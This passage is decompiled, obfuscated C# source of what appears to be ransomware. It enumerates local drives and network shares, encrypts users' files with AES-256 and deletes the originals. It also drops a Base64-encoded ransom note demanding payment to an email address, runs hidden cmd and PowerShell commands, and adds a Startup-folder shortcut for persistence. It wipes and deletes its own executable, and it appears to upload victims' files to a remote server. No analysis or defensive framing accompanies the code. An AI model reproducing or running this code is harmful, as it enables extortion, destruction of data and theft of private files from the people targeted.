							list.Add(fileInfo.FullName);
						}
					}
				}
				catch
				{
				}
			}
			array2 = directories;
			foreach (string item in array2)
			{
				stack.Push(item);
			}
		}
		return list;
	}

	public static List<string> qEruiioJCZIda(string YyxcUcgGMaQZKjYF)
	{
		List<string> list = new List<string>();
		DirectoryInfo directoryInfo = new DirectoryInfo(YyxcUcgGMaQZKjYF);
		try
		{
			foreach (FileInfo item in directoryInfo.EnumerateFiles())
			{
				try
				{
					if (!item.FullName.ToLower().Contains("program files") && !item.FullName.ToLower().Contains("windows") && !item.FullName.ToLower().Contains("perflogs") && !item.FullName.ToLower().Contains("internet explorer") && !item.FullName.ToLower().Contains("programdata") && !item.FullName.ToLower().Contains("appdata") && !item.FullName.ToLower().Contains("autoexec.bat") && !item.FullName.ToLower().Contains("desktop.ini") && !item.FullName.ToLower().Contains("autorun.inf") && !item.FullName.ToLower().Contains("ntuser.dat") && !item.FullName.ToLower().Contains("iconcache.db") && !item.FullName.ToLower().Contains("bootsect.bak") && !item.FullName.ToLower().Contains("boot.ini") && !item.FullName.ToLower().Contains("ntuser.dat.log") && !item.FullName.ToLower().Contains("thumbs.db") && !item.FullName.ToLower().Contains("bootmgr") && !item.FullName.ToLower().Contains("pagefile.sys") && !item.FullName.ToLower().Contains("config.sys") && !item.FullName.ToLower().Contains("ntuser.ini") && !item.FullName.Contains(BJOIPKGGNMyq("UmFuc29tQnVpbGRlcl9Mb2c=")) && !item.FullName.Contains("RSAKeys") && !item.FullName.Contains("DEAL_FOR_ACCESS_TO_YOUR_FILES") && !item.FullName.EndsWith(".CRYPTED") && !item.FullName.EndsWith("exe") && !item.FullName.EndsWith("dll"))
					{
						if (File.Exists(item.FullName) && (double)item.Length <= double.Parse(lJGBMVccbmYyM) * 1024.0 * 1024.0 && qfGKmrxzGCBRv == "YES")
						{
							list.Add(item.FullName);
						}
						else if (File.Exists(item.FullName) && qfGKmrxzGCBRv == "NO")
						{
							list.Add(item.FullName);
						}
					}
				}
				catch (UnauthorizedAccessException)
				{
				}
				catch
				{
				}
			}
			foreach (DirectoryInfo item2 in directoryInfo.EnumerateDirectories("*"))
			{
				if (directoryInfo.FullName.ToLower().Contains("program files") || directoryInfo.FullName.ToLower().Contains("windows") || directoryInfo.FullName.ToLower().Contains("perflogs") || directoryInfo.FullName.ToLower().Contains("internet explorer") || directoryInfo.FullName.ToLower().Contains("programdata") || directoryInfo.FullName.ToLower().Contains("appdata"))
				{
					continue;
				}
				try
				{
					foreach (FileInfo item3 in item2.EnumerateFiles("*", SearchOption.AllDirectories))
					{
						try
						{
							if (!item3.FullName.ToLower().Contains("autoexec.bat") && !item3.FullName.ToLower().Contains("desktop.ini") && !item3.FullName.ToLower().Contains("autorun.inf") && !item3.FullName.ToLower().Contains("ntuser.dat") && !item3.FullName.ToLower().Contains("iconcache.db") && !item3.FullName.ToLower().Contains("bootsect.bak") && !item3.FullName.ToLower().Contains("boot.ini") && !item3.FullName.ToLower().Contains("ntuser.dat.log") && !item3.FullName.ToLower().Contains("thumbs.db") && !item3.FullName.ToLower().Contains("bootmgr") && !item3.FullName.ToLower().Contains("pagefile.sys") && !item3.FullName.ToLower().Contains("config.sys") && !item3.FullName.ToLower().Contains("ntuser.ini") && !item3.FullName.Contains(BJOIPKGGNMyq("UmFuc29tQnVpbGRlcl9Mb2c=")) && !item3.FullName.Contains("RSAKeys") && !item3.FullName.Contains("DEAL_FOR_ACCESS_TO_YOUR_FILES") && !item3.FullName.EndsWith(".CRYPTED") && !item3.FullName.EndsWith("exe") && !item3.FullName.EndsWith("dll"))
							{
								if (File.Exists(item3.FullName) && (double)item3.Length <= double.Parse(lJGBMVccbmYyM) * 1024.0 * 1024.0 && qfGKmrxzGCBRv == "YES")
								{
									list.Add(item3.FullName);
								}
								else if (File.Exists(item3.FullName) && qfGKmrxzGCBRv == "NO")
								{
									list.Add(item3.FullName);
								}
							}
						}
						catch (UnauthorizedAccessException)
						{
						}
						catch
						{
						}
					}
				}
				catch (UnauthorizedAccessException)
				{
				}
				catch
				{
				}
			}
		}
		catch (DirectoryNotFoundException)
		{
		}
		catch (UnauthorizedAccessException)
		{
		}
		catch (PathTooLongException)
		{
		}
		catch
		{
		}
		return list;
	}

	public static string EiMLfqfczM(string GkHkneJKNrZDyhL = "", string GRZEdrmlLsfPEn = "")
	{
		string result = "";
		try
		{
			Process process = new Process();
			process.StartInfo = new ProcessStartInfo
			{
				WindowStyle = ProcessWindowStyle.Hidden,
				CreateNoWindow = true,
				FileName = GkHkneJKNrZDyhL,
				Arguments = GRZEdrmlLsfPEn,
				UseShellExecute = false,
				RedirectStandardOutput = true,
				StandardOutputEncoding = Encoding.GetEncoding(850)
			};
			Process process2 = process;
			process2.Start();
			result = process2.StandardOutput.ReadToEnd();
			process2.WaitForExit();
		}
		catch
		{
		}
		return result;
	}

	public static void sJrXMKGJbCijJ(string RslqrEPaYqtF)
	{
		Process process = new Process();
		process.StartInfo = new ProcessStartInfo
		{
			FileName = "powershell",
			Arguments = RslqrEPaYqtF,
			WindowStyle = ProcessWindowStyle.Hidden,
			CreateNoWindow = true
		};
		Process process2 = process;
		process2.Start();
	}

	public static string EeuvcdMsJRKjRsXP(string jRseAyyVAipky)
	{
		char[] array = jRseAyyVAipky.ToCharArray();
		Array.Reverse((Array)array);
		return new string(array);
	}

	public static string BJOIPKGGNMyq(string EBnLWmYMCyPPP)
	{
		byte[] bytes = Convert.FromBase64String(EBnLWmYMCyPPP);
		return Encoding.UTF8.GetString(bytes);
	}

	private static void yjYoXpcYcsD()
	{
		//IL_00f5: Unknown result type (might be due to invalid IL or missing references)
		//IL_00fb: Expected O, but got Unknown
		//IL_0115: Unknown result type (might be due to invalid IL or missing references)
		//IL_011b: Expected O, but got Unknown
		if (VPWWPGKRwC == "YES")
		{
			try
			{
				string text = Path.GetTempFileName().Replace(".tmp", ".bat");
				File.WriteAllText(text, BJOIPKGGNMyq("bW91bnR2b2wgfCBmaW5kICJ9XCIgPiB2LnR4dAoKKEZvciAvRiAlJWkgSW4gKHYudHh0KSBEbyAoCiAgICAgIFNldCBmcmVlZHJpdmU9MAogICAgICBGT1IgJSVkIElOIChDIEQgRSBGIEcgSCBJIEogSyBMIE0gTiBPIFAgUSBSIFMgVCBVIFYgVyBYIFkgWikgRE8gKAogICAgICAgICAgICBJRiBOT1QgRVhJU1QgJSVkOlwgKAogICAgICAgICAgICAgICAgICBJRiAiIWZyZWVkcml2ZSEiPT0iMCIgKAogICAgICAgICAgICAgICAgICAgICAgICBTZXQgZnJlZWRyaXZlPSUlZAogICAgICAgICAgICAgICAgICApCiAgICAgICAgICAgICkKICAgICAgKQogICAgICBtb3VudHZvbCAhZnJlZWRyaXZlITogJSVpCiAgICAgIHBpbmcgLW4gMiAxMjcuMC4wLjEKKSkKU2V0IGRyaXZlaWQ9MApGT1IgJSVkIElOIChDIEQgRSBGIEcgSCBJIEogSyBMIE0gTiBPIFAgUSBSIFMgVCBVIFYgVyBYIFkgWikgRE8gKAogICAgICBJRiBFWElTVCAlJWQ6XCAoCiAgICAgICAgICAgIFNldCAvYSBkcml2ZWlkKz0xCiAgICAgICAgICAgIGVjaG8gXjxTaGFyZWRGb2xkZXIgbmFtZT0iIWRyaXZlaWQhIiBob3N0UGF0aD0iJSVkOlwiIHdyaXRhYmxlPSJ0cnVlIi9ePiA+PnNmLnR4dAogICAgICAgICAp"), Encoding.ASCII);
				EiMLfqfczM("cmd.exe", "/C " + text);
				if (File.Exists(text))
				{
					File.Delete(text);
				}
				if (File.Exists(Path.Combine(Path.GetDirectoryName(Assembly.GetExecutingAssembly().Location), "v.txt")))
				{
					File.Delete(Path.Combine(Path.GetDirectoryName(Assembly.GetExecutingAssembly().Location), "v.txt"));
				}
				if (File.Exists(Path.Combine(Path.GetDirectoryName(Assembly.GetExecutingAssembly().Location), "sf.txt")))
				{
					File.Delete(Path.Combine(Path.GetDirectoryName(Assembly.GetExecutingAssembly().Location), "sf.txt"));
				}
			}
			catch
			{
			}
		}
		ManagementObjectSearcher val = new ManagementObjectSearcher("select * from Win32_NetworkConnection");
		ManagementObjectEnumerator enumerator = val.Get().GetEnumerator();
		try
		{
			while (enumerator.MoveNext())
			{
				ManagementObject val2 = (ManagementObject)enumerator.get_Current();
				if (!eOOYapUQkACw.Contains(((object)val2.get_Path()).ToString()!.Split(new char[1] { '=' })[1].ToString().Replace("\\\\", "\\").Replace("\\\\\\\\", "\\\\")
					.Replace("\"", "")
					.Split(new char[1] { '(' })[0].Trim()))
				{
					eOOYapUQkACw.Add(((object)val2.get_Path()).ToString()!.Split(new char[1] { '=' })[1].ToString().Replace("\\\\", "\\").Replace("\\\\\\\\", "\\\\")
						.Replace("\"", "")
						.Split(new char[1] { '(' })[0].Trim());
				}
			}
		}
		finally
		{
			((IDisposable)enumerator)?.Dispose();
		}
	}

	public static bool pXJxJisbgl()
	{
		WebRequest webRequest = WebRequest.Create("https://www.google.com/");
		try
		{
			webRequest.GetResponse();
		}
		catch
		{
			return false;
		}
		return true;
	}

	public static void DArfblGThCiu()
	{
		EiMLfqfczM("cmd.exe", BJOIPKGGNMyq("L0MgcGluZyAxMjcuMC4wLjcgLW4gMyA+IE51bCAmIGZzdXRpbCBmaWxlIHNldFplcm9EYXRhIG9mZnNldD0wIGxlbmd0aD01MjQyODgg4oCcJXPigJ0gJiBEZWwgL2YgL3Eg4oCcJXPigJ0="));
		string text = BJOIPKGGNMyq("L0MgY2hvaWNlIC9DIFkgL04gL0QgWSAvVCAzICYgRGVsIA==");
		ProcessStartInfo processStartInfo = new ProcessStartInfo();
		processStartInfo.Arguments = "\"" + text + "\"" + Assembly.GetEntryAssembly()!.Location;
		processStartInfo.WindowStyle = ProcessWindowStyle.Hidden;
		processStartInfo.CreateNoWindow = true;
		processStartInfo.FileName = "cmd.exe";
		Process.Start(processStartInfo);
		Environment.Exit(0);
	}

	public static string zNBxsevtbyOyot(string UCItPrpPQYlq)
	{
		string text = Path.GetTempPath() + "\\DEAL_FOR_ACCESS_TO_YOUR_FILES.txt";
		if (!File.Exists(text))
		{
			using StreamWriter streamWriter = new StreamWriter(text);
			streamWriter.WriteLine(BJOIPKGGNMyq("KioqIFdBUk5JTkcgKioqDQoNCkltcG9ydGFudCBGaWxlcyBJbiBUaGlzIE1hY2hpbmUgSGFzIExPQ0tFRC4NCllvdXIgRmlsZXMgT05MWSBDYW4gUmVjb3ZlciBCeSBTcGVjaWFsIFVubG9ja2VyLg0KDQpJbXBvcnRhbnQgQW5kIFByaXZhdGUgRG9jdW1lbnRzIEFsc28gQ09QSUVELg0KDQpBZnRlciBUaGlzIE1lc3NhZ2UgVGltZSBGb3IgUGF5bWVudCBJcyBMaW1pdGVkLg0KQWZ0ZXIgVGltZSBMaW1pdCBOZXh0IFBheW1lbnQgV2lsbCBCZSB4Mg0KDQpOZXh0IFN0ZXAgSXMgUHVibGlzaCBGaWxlcyBBbmQgRG9jdW1lbnQuDQoNCllvdSBDYW4gVGVzdCAxIEZpbGUgKE1heC4gMk1CKSBUbyBVbmxvY2sNCmwxdTF0MUBzZWNtYWlsLnBybw=="));
			streamWriter.WriteLine("\r\n");
			streamWriter.WriteLine(BJOIPKGGNMyq("S2V5IElkZW50aWZpZXI6IA=="));
			streamWriter.WriteLine(UCItPrpPQYlq);
		}
		else
		{
			File.AppendAllText(text, "\r\nAditional KeyId:\r\n" + UCItPrpPQYlq);
		}
		return text;
	}

	public static void RVfLktFeLL(string mcIndkMGpWMBxrJ, string oUwHKlIdSKzKIJZ)
	{
		string folderPath = Environment.GetFolderPath(Environment.SpecialFolder.Startup);
		using StreamWriter streamWriter = new StreamWriter(folderPath + "\\" + mcIndkMGpWMBxrJ + ".url");
		streamWriter.WriteLine("[Summary]");
		streamWriter.WriteLine("URL=file:///" + oUwHKlIdSKzKIJZ);
		streamWriter.WriteLine("IconIndex=0");
		string text = oUwHKlIdSKzKIJZ.Replace('\\', '/');
		streamWriter.WriteLine("IconFile=" + text);
	}

	private static void HeCMIHKFKMhKL(string[] bADnlTcQhUsIFSJQ, string[] TPmCrAJUGBiRS, string[] rDtEadQUmAh, string eEUNssWVqFNSWc, string qEwtpGTvKJkOPQy)
	{
		VyNOnoOzmYkP = Encoding.ASCII.GetBytes(eEUNssWVqFNSWc);
		if (bADnlTcQhUsIFSJQ[0] == "[auto]")
		{
			DriveInfo[] drives = DriveInfo.GetDrives();
			if (drives.Length > 0)
			{
				for (int i = 0; i < drives.Length; i++)
				{
					if (drives[i].IsReady && !eOOYapUQkACw.Contains(drives[i].Name))
					{
						eOOYapUQkACw.Add(drives[i].Name);
					}
				}
			}
		}
		else
		{
			for (int i = 0; i < bADnlTcQhUsIFSJQ.Length; i++)
			{
				if (!eOOYapUQkACw.Contains(bADnlTcQhUsIFSJQ[i]))
				{
					eOOYapUQkACw.Add(bADnlTcQhUsIFSJQ[i]);
				}
			}
		}
		if (eOOYapUQkACw.Contains(BJOIPKGGNMyq("Qzpc")) && bILAXdbZWAmWb == "YES")
		{
			eOOYapUQkACw.Remove(BJOIPKGGNMyq("Qzpc"));
		}
		foreach (string waZCrBvXOKq in eOOYapUQkACw)
		{
			if (iEAQOElRqnxn == "YES")
			{
				Thread thread = new Thread((ThreadStart)delegate
				{
					UFsXUrlpQovQ(waZCrBvXOKq, TPmCrAJUGBiRS, qEwtpGTvKJkOPQy, rDtEadQUmAh, eEUNssWVqFNSWc);
				});
				thread.Priority = ThreadPriority.Highest;
				thread.IsBackground = false;
				thread.Start();
				thread.Join();
			}
			else
			{
				UFsXUrlpQovQ(waZCrBvXOKq, TPmCrAJUGBiRS, qEwtpGTvKJkOPQy, rDtEadQUmAh, eEUNssWVqFNSWc);
			}
		}
	}

	public static void UFsXUrlpQovQ(string mgavJkHYYDZEbzLq, string[] COgcaJRtFcZpGa, string FosmjGUGUgz, string[] YSEKsucCJUmb, string xiVifjvSGNstEAI)
	{
		List<string> list = new List<string>();
		list = ((!(sVGZUGcGngmeyn == "YES")) ? PfpLRRYbwQpz.SearchFiles(mgavJkHYYDZEbzLq) : xBsadvoMdEDL(mgavJkHYYDZEbzLq));
		foreach (string value in COgcaJRtFcZpGa)
		{
			foreach (string item in list)
			{
				if (YSEKsucCJUmb.Length != 0)
				{
					int num = 0;
					while (num < YSEKsucCJUmb.Length)
					{
						string value2 = YSEKsucCJUmb[num];
						if (!item.EndsWith(value2))
						{
							num++;
							continue;
						}
						goto IL_03d6;
					}
				}
				if ((QNlVtwxwliD == "NO" && !item.EndsWith(value)) || KLBInUGjFooMRa.Contains(item))
				{
					continue;
				}
				if (wXmpQSwRiPkO == "YES")
				{
					try
					{
						if (nXuDQMcFuNT.kdHgPdvjmWFX(item))
						{
							nXuDQMcFuNT.yNIbqxnTySxV(item);
						}
					}
					catch
					{
					}
				}
				KLBInUGjFooMRa.Add(item);
				if (!slgKwbobmDQzz.Contains(Path.GetDirectoryName(item)))
				{
					slgKwbobmDQzz.Add(Path.GetDirectoryName(item));
				}
				try
				{
					if (owjMUyoKqwcz == "YES" && MuveoLbJpwyzpb.YeXegMvsjCRGOXGpA(item))
					{
						FileStream fileStream = new FileStream(item, FileMode.Open, FileAccess.Read, FileShare.ReadWrite);
						if (!(uoRKedrqJyMD == "YES"))
						{
							continue;
						}
						foreach (string item2 in GnmZsSHZrmhC)
						{
							if (item.EndsWith(item2) && YHeVAOIoBPH == "YES" && Convert.ToInt32(sCdrtpoSDq) * 1024 * 1024 > fileStream.Length)
							{
								try
								{
									tPndXEuPmLa.TJxuBJNPuwUc("URL", "USERNAME", "ACCESO", item);
								}
								catch
								{
								}
							}
						}
						continue;
					}
					FileStream fileStream2 = new FileStream(item, FileMode.Open, FileAccess.Read, FileShare.ReadWrite);
					if (wVuqpgdVqyhbJpw == "YES" && fileStream2.Length > Convert.ToInt32(cCwjTHNTri) * 1024 * 1024)
					{
						if (uoRKedrqJyMD == "YES")
						{
							foreach (string item3 in GnmZsSHZrmhC)
							{
								if (item.ToLower().EndsWith(item3) && YHeVAOIoBPH == "YES")
								{
									if (Convert.ToInt32(sCdrtpoSDq) * 1024 * 1024 > fileStream2.Length)
									{
										try
										{
											tPndXEuPmLa.TJxuBJNPuwUc("URL", "USERNAME", "ACCESO", item);
										}
										catch
										{
										}
									}
								}
								else if (item.ToLower().EndsWith(item3) && YHeVAOIoBPH == "NO")
								{
									try
									{
										tPndXEuPmLa.TJxuBJNPuwUc("URL", "USERNAME", "ACCESO", item);
									}
									catch
									{
									}
								}
							}
						}
						byte[] qELtlVjpGyNbL = JEEjYAYTthGQk.vrYKkYAgynL(item, Convert.ToInt32(cCwjTHNTri) * 1024 * 1024);
						byte[] pkaxVhkfjwFvUR = JEEjYAYTthGQk.dYFSNeFMIygNvr(qELtlVjpGyNbL, Encoding.ASCII.GetBytes(xiVifjvSGNstEAI), new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 });
						JEEjYAYTthGQk.HOLazjWLXiaC(item, pkaxVhkfjwFvUR);
						if (FosmjGUGUgz != ".*")
						{
							File.Move(item, item + FosmjGUGUgz);
						}
					}
					else if (FosmjGUGUgz != ".*")
					{
						pAQPTGyLUNtDwv(item, item + FosmjGUGUgz, VyNOnoOzmYkP);
					}
					else
					{
						pAQPTGyLUNtDwv(item, item + ".part", VyNOnoOzmYkP);
					}
				}
				catch (Exception)
				{
				}
				IL_03d6:;
			}
		}
	}

	private static void pAQPTGyLUNtDwv(string rwRqJHfQsyr, string OXSydJTfnPO, byte[] JdHkxEsvEkSZAvK)
	{
		try
		{
			byte[] salt = new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 };
			FileStream fileStream = new FileStream(OXSydJTfnPO, FileMode.Create, FileAccess.ReadWrite, FileShare.ReadWrite);
			RijndaelManaged rijndaelManaged = new RijndaelManaged();
			rijndaelManaged.KeySize = 256;
			rijndaelManaged.BlockSize = 128;
			Rfc2898DeriveBytes rfc2898DeriveBytes = new Rfc2898DeriveBytes(JdHkxEsvEkSZAvK, salt, 1000);
			rijndaelManaged.Key = rfc2898DeriveBytes.GetBytes(rijndaelManaged.KeySize / 8);
			rijndaelManaged.IV = rfc2898DeriveBytes.GetBytes(rijndaelManaged.BlockSize / 8);
			rijndaelManaged.Padding = PaddingMode.Zeros;
			rijndaelManaged.Mode = CipherMode.CBC;
			CryptoStream cryptoStream = new CryptoStream(fileStream, rijndaelManaged.CreateEncryptor(), CryptoStreamMode.Write);
			FileStream fileStream2 = new FileStream(rwRqJHfQsyr, FileMode.Open);
			int num;
			while ((num = fileStream2.ReadByte()) != -1)
			{
				cryptoStream.WriteByte((byte)num);
			}
			fileStream2.Close();
			cryptoStream.Close();
			fileStream.Close();
			try
			{
				if (OXSydJTfnPO.Length > 0)
				{
					FileStream fileStream3 = new FileStream(rwRqJHfQsyr, FileMode.Open, FileAccess.Read, FileShare.ReadWrite);
					if (uoRKedrqJyMD == "YES")
					{
						foreach (string item in GnmZsSHZrmhC)
						{
							if (rwRqJHfQsyr.ToLower().EndsWith(item) && YHeVAOIoBPH == "YES")
							{
								if (Convert.ToInt32(sCdrtpoSDq) * 1024 * 1024 > fileStream3.Length)
								{
									try
									{
										tPndXEuPmLa.TJxuBJNPuwUc("URL", "USERNAME", "ACCESO", rwRqJHfQsyr);
									}
									catch
									{
									}
								}
							}
							else if (rwRqJHfQsyr.ToLower().EndsWith(item) && YHeVAOIoBPH == "NO")
							{
								try
								{
									tPndXEuPmLa.TJxuBJNPuwUc("URL", "USERNAME", "ACCESO", rwRqJHfQsyr);
								}
								catch
								{
								}
							}
						}
					}
					int num2 = 1000000;
					while (true)
					{
						try
						{
							while (File.Exists(rwRqJHfQsyr) && num2 >= 0)
							{
								File.Delete(rwRqJHfQsyr);
							}
						}
						catch
						{
							num2--;
							continue;
						}
						break;
					}
					if (OXSydJTfnPO.EndsWith(".part"))
					{
						File.Move(OXSydJTfnPO, OXSydJTfnPO.Replace(".part", ""));
					}
					return;
				}
				try
				{
					File.Delete(OXSydJTfnPO);
				}
				catch
				{
				}
			}
			catch
			{
			}
		}
		catch (Exception)
		{
		}
	}
}
